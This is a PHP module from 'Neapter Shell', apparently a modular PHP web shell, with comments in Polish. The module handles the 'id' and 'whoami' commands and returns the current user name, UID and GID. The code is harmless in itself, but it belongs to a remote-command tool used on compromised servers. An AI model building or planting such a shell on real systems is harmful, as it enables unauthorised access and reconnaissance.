<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Wyswietlanie nazwy uzytkownika, ID uzytkownika oraz ID grupy
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba3
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleId extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public function getCommands()
    {
        return array
        (
            'id',
            'whoami'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.00 2011-10-19 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public function getHelp()
    {
        return <<<DATA
Informacje o uzytkowniku

	Użycie:
		id
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        return sprintf('user=%s uid=%d gid=%d', get_current_user(), getmyuid(), getmygid());
    }

}